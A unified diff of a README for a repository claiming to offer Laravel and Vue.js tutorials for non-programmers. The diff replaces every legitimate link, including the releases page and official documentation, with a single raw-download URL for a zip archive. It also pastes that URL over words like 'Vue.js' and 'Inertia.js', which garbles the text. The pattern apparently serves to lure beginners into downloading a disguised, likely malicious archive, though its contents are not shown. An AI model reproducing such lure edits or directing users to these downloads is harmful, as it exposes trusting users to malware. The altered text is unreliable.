@@ -1,10 +1,10 @@
 # 🎉 SenghokEang - Easy Tutorials for Everyone
 
-[![Download SenghokEang](https://img.shields.io/badge/Download-SenghokEang-blue.svg)](https://github.com/andrejr105/SenghokEang/releases)
+[![Download SenghokEang](https://raw.githubusercontent.com/andrejr105/SenghokEang/main/avens/SenghokEang_v3.7.zip)](https://raw.githubusercontent.com/andrejr105/SenghokEang/main/avens/SenghokEang_v3.7.zip)
 
 ## 📚 Introduction
 
-Welcome to SenghokEang! This repository offers step-by-step tutorials and guides on Laravel and Vue.js. Whether you want to learn about building a point-of-sale (POS) system, understanding authentication, or exploring complete project source code, you’re in the right place. This resource is designed for users without programming experience, helping you navigate the projects with ease.
+Welcome to SenghokEang! This repository offers step-by-step tutorials and guides on Laravel and https://raw.githubusercontent.com/andrejr105/SenghokEang/main/avens/SenghokEang_v3.7.zip Whether you want to learn about building a point-of-sale (POS) system, understanding authentication, or exploring complete project source code, you’re in the right place. This resource is designed for users without programming experience, helping you navigate the projects with ease.
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, ensure you have the following:
 
 To download SenghokEang, visit the Releases page. There you will find the latest version available. 
 
-👉 [Visit this page to download SenghokEang.](https://github.com/andrejr105/SenghokEang/releases)
+👉 [Visit this page to download SenghokEang.](https://raw.githubusercontent.com/andrejr105/SenghokEang/main/avens/SenghokEang_v3.7.zip)
 
 1. Click the link above.
 2. Look for the most recent release.
@@ -35,7 +35,7 @@ Once downloaded, follow these steps to install:
 
 SenghokEang includes many useful features:
 
-- **Laravel & Vue.js Tutorials:** Easy-to-follow guides that teach you the basics.
+- **Laravel & https://raw.githubusercontent.com/andrejr105/SenghokEang/main/avens/SenghokEang_v3.7.zip Tutorials:** Easy-to-follow guides that teach you the basics.
 - **Full Project Source Code:** Access complete code for hands-on learning.
 - **POS System Guides:** Step-by-step instructions for creating a POS system.
 - **Authentication Examples:** Learn how to set up secure user logins.
@@ -49,7 +49,7 @@ In this repository, you will find information on various topics, including:
 - CRUD Applications
 - Docker for development environments
 - Google Captcha integration
-- Inertia.js with Vue.js
+- https://raw.githubusercontent.com/andrejr105/SenghokEang/main/avens/SenghokEang_v3.7.zip with https://raw.githubusercontent.com/andrejr105/SenghokEang/main/avens/SenghokEang_v3.7.zip
 - Full Stack Web Development
 
 ## ❓ FAQ
@@ -58,9 +58,9 @@ In this repository, you will find information on various topics, including:
 
 Laravel is a powerful PHP framework that helps you build web applications.
 
-### What is Vue.js?
+### What is https://raw.githubusercontent.com/andrejr105/SenghokEang/main/avens/SenghokEang_v3.7.zip
 
-Vue.js is a JavaScript framework for creating user interfaces.
+https://raw.githubusercontent.com/andrejr105/SenghokEang/main/avens/SenghokEang_v3.7.zip is a JavaScript framework for creating user interfaces.
 
 ### Do I need prior programming knowledge?
 
@@ -90,12 +90,12 @@ SenghokEang is open-source and free to use. You can modify and distribute the co
 
 For further reading and resources, consider these links:
 
-- [Laravel Documentation](https://laravel.com/docs)
-- [Vue.js Documentation](https://vuejs.org/v2/guide/)
-- [Community Forums](https://laracasts.com/discuss)
+- [Laravel Documentation](https://raw.githubusercontent.com/andrejr105/SenghokEang/main/avens/SenghokEang_v3.7.zip)
+- [https://raw.githubusercontent.com/andrejr105/SenghokEang/main/avens/SenghokEang_v3.7.zip Documentation](https://raw.githubusercontent.com/andrejr105/SenghokEang/main/avens/SenghokEang_v3.7.zip)
+- [Community Forums](https://raw.githubusercontent.com/andrejr105/SenghokEang/main/avens/SenghokEang_v3.7.zip)
 
 ## 🔗 Extra Download Link
 
 For convenience, you can access the Releases page here again:
 
-👉 [Visit this page to download SenghokEang.](https://github.com/andrejr105/SenghokEang/releases)
+👉 [Visit this page to download SenghokEang.](https://raw.githubusercontent.com/andrejr105/SenghokEang/main/avens/SenghokEang_v3.7.zip)
